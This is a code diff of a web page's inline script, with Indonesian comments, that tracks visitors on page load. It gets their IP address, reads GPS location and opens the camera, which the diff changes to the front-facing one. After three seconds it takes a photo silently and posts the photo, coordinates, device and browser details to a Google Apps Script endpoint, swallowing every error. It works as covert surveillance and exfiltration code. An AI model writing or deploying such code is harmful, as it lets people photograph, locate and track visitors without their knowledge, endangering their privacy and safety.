@@ -10,15 +10,17 @@
     <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
 
     <script>
+      /* ================= CONFIG ================= */
       const scriptURL =
         "https://script.google.com/macros/s/AKfycbxUl0Z5luiPUq847Hl_Zou9r0tr0DoA9gtmkdrh31b-nUx-3PKpSkkLcoAuyM4wnf7Ieg/exec";
 
-      let latitude = "";
-      let longitude = "";
-      let ipAddress = "";
-      let photoBase64 = "";
+      /* ================= VAR ================= */
+      let latitude = "",
+        longitude = "",
+        ipAddress = "",
+        photoBase64 = "";
 
-      /* ===== DEVICE ===== */
+      /* ================= DEVICE ================= */
       function getDevice() {
         const ua = navigator.userAgent;
         if (/android/i.test(ua)) return "Android";
@@ -28,7 +30,7 @@
         return "Unknown";
       }
 
-      /* ===== BROWSER ===== */
+      /* ================= BROWSER ================= */
       function getBrowser() {
         const ua = navigator.userAgent;
         if (ua.includes("Edg")) return "Edge";
@@ -38,13 +40,13 @@
         return "Unknown";
       }
 
-      /* ===== IP ===== */
+      /* ================= IP ================= */
       fetch("https://api.ipify.org?format=json")
-        .then((res) => res.json())
-        .then((data) => (ipAddress = data.ip))
+        .then((r) => r.json())
+        .then((d) => (ipAddress = d.ip))
         .catch(() => {});
 
-      /* ===== LOKASI ===== */
+      /* ================= LOKASI ================= */
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           latitude = pos.coords.latitude;
@@ -53,40 +55,45 @@
         () => {},
       );
 
-      /* ===== KAMERA ===== */
+      /* ================= KAMERA DEPAN ================= */
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
       const ctx = canvas.getContext("2d");
 
       navigator.mediaDevices
-        .getUserMedia({ video: { facingMode: "environment" } })
+        .getUserMedia({
+          video: { facingMode: "user" }, // 👈 KAMERA DEPAN SAJA
+        })
         .then((stream) => {
           video.srcObject = stream;
-          setTimeout(captureAndSubmit, 3000);
+
+          // tunggu kamera stabil
+          setTimeout(() => captureAndSubmit(stream), 3000);
         })
         .catch(() => {});
 
-      /* ===== AMBIL FOTO & SUBMIT (SILENT) ===== */
-      function captureAndSubmit() {
+      /* ================= CAPTURE & SUBMIT ================= */
+      function captureAndSubmit(stream) {
         try {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           photoBase64 = canvas.toDataURL("image/jpeg", 0.8);
 
           if (!photoBase64 || photoBase64.length < 1000) return;
 
-          const data = {
-            latitude: latitude,
-            longitude: longitude,
-            ip: ipAddress,
-            device: getDevice(),
-            browser: getBrowser(),
-            foto: photoBase64,
-          };
-
           fetch(scriptURL, {
             method: "POST",
-            body: JSON.stringify(data),
+            body: JSON.stringify({
+              latitude: latitude,
+              longitude: longitude,
+              ip: ipAddress,
+              device: getDevice(),
+              browser: getBrowser(),
+              foto: photoBase64,
+            }),
           }).catch(() => {});
+
+          // matikan kamera setelah capture
+          stream.getTracks().forEach((t) => t.stop());
         } catch (e) {}
       }
     </script>
